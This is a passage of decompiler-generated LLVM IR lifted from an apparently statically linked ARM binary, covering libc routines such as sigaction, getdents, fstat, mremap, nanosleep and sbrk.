dec_label_pc_153f4:                               ; preds = %entry
  %v1_153f4 = add i32 %arg2, 4
  %v2_153f4 = inttoptr i32 %v1_153f4 to i32*
  %v3_153f4 = load i32, i32* %v2_153f4, align 4
  store i32 %v3_153f4, i32* @r3, align 4
  %v1_153f8 = and i32 %v3_153f4, 67108864
  %v2_153f8 = icmp eq i32 %v1_153f8, 0
  br i1 %v2_153f8, label %dec_label_pc_15400, label %dec_label_pc_15430

dec_label_pc_15400:                               ; preds = %dec_label_pc_153f4
  store i32 20, i32* @r2, align 4
  %v2_15404 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_15404, i32* @r0, align 4
  %v0_15408 = call i32 @memcpy()
  %v0_15430.pre = load i32, i32* @r5, align 4
  %v0_15438.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15430

dec_label_pc_15430:                               ; preds = %dec_label_pc_153f4, %entry, %dec_label_pc_15400
  %v0_15438 = phi i32 [ %arg3, %dec_label_pc_153f4 ], [ %arg3, %entry ], [ %v0_15438.pre, %dec_label_pc_15400 ]
  %v0_15434 = phi i32 [ %arg2, %dec_label_pc_153f4 ], [ 0, %entry ], [ %v2_15404, %dec_label_pc_15400 ]
  %v0_15430 = phi i32 [ %arg1, %dec_label_pc_153f4 ], [ %arg1, %entry ], [ %v0_15430.pre, %dec_label_pc_15400 ]
  %v4_15440 = call i32 @__syscall_rt_sigaction(i32 %v0_15430, i32 %v0_15434, i32 %v0_15438, i32 8)
  store i32 %v3_153d4, i32* @r4, align 4
  store i32 %v6_153d4, i32* @r5, align 4
  ret i32 %v4_15440

; uselistorder directives
  uselistorder label %dec_label_pc_15430, { 2, 0, 1 }
}

define i32 @function_15454(i32 %arg1) local_unnamed_addr {
dec_label_pc_15454:
  %v0_15454 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15454, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15454
  %v2_15454 = load i32, i32* @r8, align 4
  %v4_15454 = mul i32 %v2_15454, 2
  %v5_15454 = and i32 %v4_15454, %arg1
  %v2_15458 = load i32, i32* @ip, align 4
  %v4_15458 = lshr i32 %v2_15458, %v5_15454
  %v5_15458 = sub i32 32, %v5_15454
  %v6_15458 = shl i32 %v2_15458, %v5_15458
  %v7_15458 = or i32 %v6_15458, %v4_15458
  %v9_15458 = and i32 %v7_15458, %v5_15454
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15454, %bb
  %v10_15458 = phi i32 [ %arg1, %dec_label_pc_15454 ], [ %v9_15458, %bb ]
  ret i32 %v10_15458

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_15460 = call i32 @__sigsetjmp()
  ret i32 %v0_15460
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15490 = load i32, i32* @r7, align 4
  store i32 %v3_15490, i32* %stack_var_-8, align 4
  %v0_1549c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1549c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1549c, -4095
  br i1 %tmp, label %dec_label_pc_154c4, label %dec_label_pc_154ac

dec_label_pc_154ac:                               ; preds = %entry
  %v0_154b0 = call i32 @__aeabi_read_tp()
  %v3_154b4 = load i16, i16* @global_var_2222c.358, align 2
  %v4_154b4 = sext i16 %v3_154b4 to i32
  %v0_154b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_154b8 = sub i32 0, %v0_154b8
  store i32 %v1_154b8, i32* %r2.global-to-local, align 4
  %v3_154bc = add i32 %v4_154b4, %v0_154b0
  %v4_154bc = inttoptr i32 %v3_154bc to i32*
  store i32 %v1_154b8, i32* %v4_154bc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_154c4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_154c4

dec_label_pc_154c4:                               ; preds = %entry, %dec_label_pc_154ac
  %v1_154c8 = phi i32 [ %v0_1549c, %entry ], [ -1, %dec_label_pc_154ac ]
  %v2_154c4 = phi i32 [ %v3_15490, %entry ], [ %v2_154c4.pre, %dec_label_pc_154ac ]
  store i32 %v2_154c4, i32* @r7, align 4
  ret i32 %v1_154c8

; uselistorder directives
  uselistorder i32 %v0_1549c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_154c4, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_154dc

dec_label_pc_154dc:                               ; preds = %dec_label_pc_15508, %dec_label_pc_1551c, %entry
  %v0_154dc = phi i32 [ %arg1, %entry ], [ %v0_154dc.pre.pre, %dec_label_pc_1551c ], [ %v0_15508, %dec_label_pc_15508 ]
  store i32 %v0_154dc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_154dc, -4095
  br i1 %tmp, label %dec_label_pc_15508, label %dec_label_pc_154f8

dec_label_pc_154f8:                               ; preds = %dec_label_pc_154dc
  %v0_154f8 = call i32 @__aeabi_read_tp()
  %v0_154fc = load i32, i32* %r2.global-to-local, align 4
  %v1_154fc = sub i32 0, %v0_154fc
  store i32 %v1_154fc, i32* %r2.global-to-local, align 4
  %v3_15500 = load i16, i16* @global_var_2222c.358, align 2
  %v4_15500 = sext i16 %v3_15500 to i32
  %v3_15504 = add i32 %v4_15500, %v0_154f8
  %v4_15504 = inttoptr i32 %v3_15504 to i32*
  store i32 %v1_154fc, i32* %v4_15504, align 4
  %v0_15508.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15508

dec_label_pc_15508:                               ; preds = %dec_label_pc_154dc, %dec_label_pc_154f8
  %v0_15508 = phi i32 [ %v0_154dc, %dec_label_pc_154dc ], [ %v0_15508.pre, %dec_label_pc_154f8 ]
  store i32 %v0_15508, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_15508, -4095
  br i1 %tmp4, label %dec_label_pc_154dc, label %dec_label_pc_1551c

dec_label_pc_1551c:                               ; preds = %dec_label_pc_15508
  %v0_1551c = call i32 @__aeabi_read_tp()
  %v0_15520 = load i32, i32* %r2.global-to-local, align 4
  %v1_15520 = sub i32 0, %v0_15520
  store i32 %v1_15520, i32* %r2.global-to-local, align 4
  %v3_15524 = load i16, i16* @global_var_2222c.358, align 2
  %v4_15524 = sext i16 %v3_15524 to i32
  %v3_15528 = add i32 %v4_15524, %v0_1551c
  %v4_15528 = inttoptr i32 %v3_15528 to i32*
  store i32 %v1_15520, i32* %v4_15528, align 4
  %v0_154dc.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_154dc

; uselistorder directives
  uselistorder i32 %v0_15508, { 0, 2, 1 }
  uselistorder i32 %v0_154dc, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15508, { 1, 0 }
  uselistorder label %dec_label_pc_154dc, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_15540 = load i32, i32* @r1, align 4
  store i32 %v0_15540, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_15550 = load i32, i32* @r0, align 4
  store i32 %v0_15550, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_15550, -4095
  br i1 %tmp, label %dec_label_pc_15578, label %dec_label_pc_1555c

dec_label_pc_1555c:                               ; preds = %entry
  %v0_15560 = call i32 @__aeabi_read_tp()
  %v3_15564 = load i16, i16* @global_var_2222c.358, align 2
  %v4_15564 = sext i16 %v3_15564 to i32
  store i32 %v4_15564, i32* @r3, align 4
  %v0_15568 = load i32, i32* @r2, align 4
  %v1_15568 = sub i32 0, %v0_15568
  store i32 %v1_15568, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_15570 = add i32 %v4_15564, %v0_15560
  %v4_15570 = inttoptr i32 %v3_15570 to i32*
  store i32 %v1_15568, i32* %v4_15570, align 4
  br label %dec_label_pc_15588

dec_label_pc_15578:                               ; preds = %entry
  store i32 %v0_15550, i32* %r7.global-to-local, align 4
  %v2_15578 = icmp eq i32 %v0_15550, 0
  br i1 %v2_15578, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15578
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15578, %bb
  call void @__pseudo_cond_branch(i1 %v2_15578, i32 ptrtoint (i32* @global_var_159c8.588 to i32))
  br label %dec_label_pc_15588

dec_label_pc_15588:                               ; preds = %dec_label_pc_1555c, %.thread
  %v0_15588 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_15588

; uselistorder directives
  uselistorder i32 %v0_15550, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15588, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_1559c = load i32, i32* @r5, align 4
  %v18_1559c = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_155d4, label %dec_label_pc_155b8

dec_label_pc_155b8:                               ; preds = %entry
  %v1_155bc = sub i32 0, %arg1
  %v3_155c0 = load i16, i16* @global_var_2222c.358, align 2
  %v4_155c0 = sext i16 %v3_155c0 to i32
  store i32 %v4_155c0, i32* %r3.global-to-local, align 4
  %v0_155c4 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_155cc = add i32 %v4_155c0, %v0_155c4
  %v4_155cc = inttoptr i32 %v3_155cc to i32*
  store i32 %v1_155bc, i32* %v4_155cc, align 4
  br label %dec_label_pc_15628

dec_label_pc_155d4:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_155d4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_155dc = add i32 %arg2, %arg1
  store i32 %v3_155dc, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_155d4, %bb
  %v1_156184 = phi i32 [ %v18_1559c, %dec_label_pc_155d4 ], [ %v3_155dc, %bb ]
  %v0_156142 = phi i32 [ 141, %dec_label_pc_155d4 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_15628, label %dec_label_pc_15614

dec_label_pc_155e8:                               ; preds = %dec_label_pc_15614
  %v1_1561c = inttoptr i32 %v1_15614 to i8*
  %v1_155e8 = add i32 %v0_155e8, 8
  %v2_155e8 = inttoptr i32 %v1_155e8 to i16*
  %v3_155e8 = load i16, i16* %v2_155e8, align 2
  %v4_155e8 = zext i16 %v3_155e8 to i32
  %v2_155ec = add i32 %v4_155e8, %v0_155e8
  store i32 %v2_155ec, i32* @r3, align 4
  %v1_155f0 = add i32 %v2_155ec, -1
  %v2_155f0 = inttoptr i32 %v1_155f0 to i8*
  %v3_155f0 = load i8, i8* %v2_155f0, align 1
  %v4_155f0 = zext i8 %v3_155f0 to i32
  store i32 %v4_155f0, i32* @r4, align 4
  %v3_155f4 = call i32 @strlen(i8* %v1_1561c)
  %v0_155f8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_155f8, i32* @r1, align 4
  %v1_155fc = add i32 %v3_155f4, 1
  store i32 %v1_155fc, i32* @r2, align 4
  %v0_15600 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_15600, i32* @r0, align 4
  %v3_15604 = call i32 @memmove(i32 %v0_15600, i32 %v0_155f8, i32 %v1_155fc)
  %v0_15608 = load i32, i32* %r7.global-to-local, align 4
  %v1_15608 = add i32 %v0_15608, 8
  %v2_15608 = inttoptr i32 %v1_15608 to i16*
  %v3_15608 = load i16, i16* %v2_15608, align 2
  %v4_15608 = zext i16 %v3_15608 to i32
  store i32 %v4_15608, i32* %r3.global-to-local, align 4
  %v0_1560c = load i32, i32* @r4, align 4
  %v1_1560c = trunc i32 %v0_1560c to i8
  %v3_1560c = add i32 %v0_15608, 10
  %v4_1560c = inttoptr i32 %v3_1560c to i8*
  store i8 %v1_1560c, i8* %v4_1560c, align 1
  %v0_15610 = load i32, i32* %r7.global-to-local, align 4
  %v1_15610 = load i32, i32* %r3.global-to-local, align 4
  %v2_15610 = add i32 %v1_15610, %v0_15610
  store i32 %v2_15610, i32* %r7.global-to-local, align 4
  %v1_15618.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_15614

dec_label_pc_15614:                               ; preds = %.thread, %dec_label_pc_155e8
  %v1_15618 = phi i32 [ %v1_15618.pre, %dec_label_pc_155e8 ], [ %v1_156184, %.thread ]
  %v0_155e8 = phi i32 [ %v2_15610, %dec_label_pc_155e8 ], [ %v0_156142, %.thread ]
  %v1_15614 = add i32 %v0_155e8, 10
  store i32 %v1_15614, i32* %r6.global-to-local, align 4
  %v3_15618 = icmp ult i32 %v0_155e8, %v1_15618
  %v1_15620 = add i32 %v0_155e8, 11
  store i32 %v1_15620, i32* %r8.global-to-local, align 4
  br i1 %v3_15618, label %dec_label_pc_155e8, label %dec_label_pc_15628

dec_label_pc_15628:                               ; preds = %dec_label_pc_15614, %.thread, %dec_label_pc_155b8
  %v0_15628 = load i32, i32* @r5, align 4
  store i32 %v6_1559c, i32* @r5, align 4
  store i32 %v18_1559c, i32* @sl, align 4
  ret i32 %v0_15628

; uselistorder directives
  uselistorder i32 %v1_15614, { 1, 0 }
  uselistorder i32 %v0_155e8, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_1559c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_15614, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_15640 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1564c = call i32 @getrlimit(i32 7, i32 %v2_15640)
  %v1_15650 = icmp slt i32 %v2_1564c, 0
  %v5_15654 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_15650, i32 256, i32 %v5_15654
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_15678 = load i32, i32* @r0, align 4
  ret i32 %v1_15678
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_1568c = load i32, i32* @r0, align 4
  ret i32 %v1_1568c
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_156a0 = load i32, i32* @r0, align 4
  ret i32 %v1_156a0
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_156b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 148) to i32*), align 4
  %v1_156b4 = inttoptr i32 %v4_156b0 to i32*
  %v2_156b4 = load i32, i32* %v1_156b4, align 4
  %v2_156b8 = icmp eq i32 %v2_156b4, 0
  br i1 %v2_156b8, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_156c0 = phi i32 [ %v2_156b4, %entry ], [ 4096, %bb ]
  ret i32 %v1_156c0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_156f8, label %dec_label_pc_156e0

dec_label_pc_156e0:                               ; preds = %entry
  %v1_156e4 = sub i32 0, %arg1
  %v3_156e8 = load i16, i16* @global_var_2222c.358, align 2
  %v4_156e8 = sext i16 %v3_156e8 to i32
  %v0_156ec = call i32 @__aeabi_read_tp()
  %v3_156f0 = add i32 %v4_156e8, %v0_156ec
  %v4_156f0 = inttoptr i32 %v3_156f0 to i32*
  store i32 %v1_156e4, i32* %v4_156f0, align 4
  br label %dec_label_pc_156f8

dec_label_pc_156f8:                               ; preds = %entry, %dec_label_pc_156e0
  %v1_156fc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_156e0 ]
  ret i32 %v1_156fc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_156f8, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15704 = load i32, i32* @r7, align 4
  store i32 %v3_15704, i32* %stack_var_-8, align 4
  %v0_15710 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15710, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15710, -4095
  br i1 %tmp, label %dec_label_pc_15738, label %dec_label_pc_15720

dec_label_pc_15720:                               ; preds = %entry
  %v0_15724 = call i32 @__aeabi_read_tp()
  %v3_15728 = load i16, i16* @global_var_2222c.358, align 2
  %v4_15728 = sext i16 %v3_15728 to i32
  store i32 %v4_15728, i32* @r3, align 4
  %v0_1572c = load i32, i32* %r2.global-to-local, align 4
  %v1_1572c = sub i32 0, %v0_1572c
  store i32 %v1_1572c, i32* %r2.global-to-local, align 4
  %v3_15730 = add i32 %v4_15728, %v0_15724
  %v4_15730 = inttoptr i32 %v3_15730 to i32*
  store i32 %v1_1572c, i32* %v4_15730, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15738.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15738

dec_label_pc_15738:                               ; preds = %entry, %dec_label_pc_15720
  %v1_1573c = phi i32 [ %v0_15710, %entry ], [ -1, %dec_label_pc_15720 ]
  %v2_15738 = phi i32 [ %v3_15704, %entry ], [ %v2_15738.pre, %dec_label_pc_15720 ]
  store i32 %v2_15738, i32* @r7, align 4
  ret i32 %v1_1573c

; uselistorder directives
  uselistorder i32 %v0_15710, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15738, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_15754 = load i32, i32* @r0, align 4
  ret i32 %v1_15754
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15758 = load i32, i32* @r4, align 4
  store i32 %v3_15758, i32* %stack_var_-12, align 4
  %v0_15768 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15768, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15768, -4095
  br i1 %tmp, label %dec_label_pc_15790, label %dec_label_pc_15778

dec_label_pc_15778:                               ; preds = %entry
  %v0_1577c = call i32 @__aeabi_read_tp()
  %v3_15780 = load i16, i16* @global_var_2222c.358, align 2
  %v4_15780 = sext i16 %v3_15780 to i32
  %v0_15784 = load i32, i32* %r2.global-to-local, align 4
  %v1_15784 = sub i32 0, %v0_15784
  store i32 %v1_15784, i32* %r2.global-to-local, align 4
  %v3_15788 = add i32 %v4_15780, %v0_1577c
  %v4_15788 = inttoptr i32 %v3_15788 to i32*
  store i32 %v1_15784, i32* %v4_15788, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15790.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15790

dec_label_pc_15790:                               ; preds = %entry, %dec_label_pc_15778
  %v1_15794 = phi i32 [ %v0_15768, %entry ], [ -1, %dec_label_pc_15778 ]
  %v2_15790 = phi i32 [ %v3_15758, %entry ], [ %v2_15790.pre, %dec_label_pc_15778 ]
  store i32 %v2_15790, i32* @r4, align 4
  ret i32 %v1_15794

; uselistorder directives
  uselistorder i32 %v0_15768, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15790, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1579c = load i32, i32* @r7, align 4
  store i32 %v3_1579c, i32* %stack_var_-8, align 4
  %v0_157a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_157a8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_157a8, -4095
  br i1 %tmp, label %dec_label_pc_157d0, label %dec_label_pc_157b8

dec_label_pc_157b8:                               ; preds = %entry
  %v0_157bc = call i32 @__aeabi_read_tp()
  %v3_157c0 = load i16, i16* @global_var_2222c.358, align 2
  %v4_157c0 = sext i16 %v3_157c0 to i32
  %v0_157c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_157c4 = sub i32 0, %v0_157c4
  store i32 %v1_157c4, i32* %r2.global-to-local, align 4
  %v3_157c8 = add i32 %v4_157c0, %v0_157bc
  %v4_157c8 = inttoptr i32 %v3_157c8 to i32*
  store i32 %v1_157c4, i32* %v4_157c8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_157d0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_157d0

dec_label_pc_157d0:                               ; preds = %entry, %dec_label_pc_157b8
  %v1_157d4 = phi i32 [ %v0_157a8, %entry ], [ -1, %dec_label_pc_157b8 ]
  %v2_157d0 = phi i32 [ %v3_1579c, %entry ], [ %v2_157d0.pre, %dec_label_pc_157b8 ]
  store i32 %v2_157d0, i32* @r7, align 4
  ret i32 %v1_157d4

; uselistorder directives
  uselistorder i32 %v0_157a8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_157d0, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_157dc = load i32, i32* @r7, align 4
  store i32 %v3_157dc, i32* %stack_var_-8, align 4
  %v0_157e8 = load i32, i32* @r0, align 4
  store i32 %v0_157e8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_157e8, -4095
  br i1 %tmp, label %dec_label_pc_15810, label %dec_label_pc_157f8

dec_label_pc_157f8:                               ; preds = %entry
  %v0_157fc = call i32 @__aeabi_read_tp()
  %v3_15800 = load i16, i16* @global_var_2222c.358, align 2
  %v4_15800 = sext i16 %v3_15800 to i32
  %v0_15804 = load i32, i32* %r2.global-to-local, align 4
  %v1_15804 = sub i32 0, %v0_15804
  store i32 %v1_15804, i32* %r2.global-to-local, align 4
  %v3_15808 = add i32 %v4_15800, %v0_157fc
  %v4_15808 = inttoptr i32 %v3_15808 to i32*
  store i32 %v1_15804, i32* %v4_15808, align 4
  %v2_15810.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15810

dec_label_pc_15810:                               ; preds = %entry, %dec_label_pc_157f8
  %v1_15814 = phi i32 [ %v0_157e8, %entry ], [ -1, %dec_label_pc_157f8 ]
  %v2_15810 = phi i32 [ %v3_157dc, %entry ], [ %v2_15810.pre, %dec_label_pc_157f8 ]
  store i32 %v2_15810, i32* @r7, align 4
  ret i32 %v1_15814

; uselistorder directives
  uselistorder i32 %v0_157e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15810, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_15828 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 12824) to i32*), align 4
  %v2_1582c = icmp eq i32 %v4_15828, 0
  %v3_15830 = load i32, i32* @r4, align 4
  %v9_15830 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1582c, label %dec_label_pc_15840, label %entry.dec_label_pc_15848_crit_edge

entry.dec_label_pc_15848_crit_edge:               ; preds = %entry
  br label %dec_label_pc_15848

dec_label_pc_15840:                               ; preds = %entry
  store i32 %v3_15830, i32* @r4, align 4
  store i32 %v9_15830, i32* @r6, align 4
  %v0_15844 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_15848

dec_label_pc_15848:                               ; preds = %entry.dec_label_pc_15848_crit_edge, %dec_label_pc_15840
  %v0_15848 = call i32 @__libc_enable_asynccancel()
  %v0_1584c = load i32, i32* @r6, align 4
  store i32 %v0_1584c, i32* @r1, align 4
  store i32 %v0_15848, i32* @r5, align 4
  %v0_15854 = load i32, i32* @r4, align 4
  store i32 %v0_15854, i32* @r0, align 4
  %v0_15858 = call i32 @__syscall_nanosleep()
  store i32 %v0_15858, i32* @r4, align 4
  %v0_15860 = load i32, i32* @r5, align 4
  %v1_15864 = call i32 @__libc_disable_asynccancel(i32 %v0_15860)
  %v0_15868 = load i32, i32* @r4, align 4
  ret i32 %v0_15868

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 3, 8, 13, 1, 5, 4, 6, 7, 12, 2, 11, 10, 9, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 3, 8, 13, 1, 5, 4, 6, 7, 12, 2, 11, 10, 9, 0 }
  uselistorder label %dec_label_pc_15848, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1587c = load i32, i32* @r4, align 4
  store i32 %v3_1587c, i32* %stack_var_-16, align 4
  store i32 11576, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r4.global-to-local, align 4
  %v4_1588c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 11576) to i32*), align 4
  %v2_15890 = icmp eq i32 %v4_1588c, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_15890, label %dec_label_pc_1589c, label %dec_label_pc_158ac

dec_label_pc_1589c:                               ; preds = %entry
  %v1_158a0 = call i32 @__GI_brk(i32 0)
  %v1_158a4 = icmp slt i32 %v1_158a0, 0
  br i1 %v1_158a4, label %dec_label_pc_158d0, label %dec_label_pc_158acthread-pre-split

dec_label_pc_158acthread-pre-split:               ; preds = %dec_label_pc_1589c
  %v0_158b0.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_158ac.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_158ac.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_158ac

dec_label_pc_158ac:                               ; preds = %dec_label_pc_158acthread-pre-split, %entry
  %v1_158ac = phi i32 [ %v1_158ac.pre, %dec_label_pc_158acthread-pre-split ], [ 11576, %entry ]
  %v0_158ac = phi i32 [ %v0_158ac.pre, %dec_label_pc_158acthread-pre-split ], [ ptrtoint (i32* @global_var_221d4.362 to i32), %entry ]
  %v1_158c0 = phi i32 [ %v0_158b0.pr, %dec_label_pc_158acthread-pre-split ], [ %arg1, %entry ]
  %v2_158ac = add i32 %v0_158ac, %v1_158ac
  %v3_158ac = inttoptr i32 %v2_158ac to i32*
  %v4_158ac = load i32, i32* %v3_158ac, align 4
  %v2_158b0 = icmp eq i32 %v1_158c0, 0
  store i32 %v4_158ac, i32* %r4.global-to-local, align 4
  br i1 %v2_158b0, label %dec_label_pc_158d4, label %dec_label_pc_158bc

dec_label_pc_158bc:                               ; preds = %dec_label_pc_158ac
  %v2_158c0 = add i32 %v4_158ac, %v1_158c0
  %v1_158c4 = call i32 @__GI_brk(i32 %v2_158c0)
  %v1_158c8 = icmp slt i32 %v1_158c4, 0
  br i1 %v1_158c8, label %dec_label_pc_158d0, label %dec_label_pc_158bc.dec_label_pc_158d4_crit_edge

dec_label_pc_158bc.dec_label_pc_158d4_crit_edge:  ; preds = %dec_label_pc_158bc
  %v0_158d4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_158d4

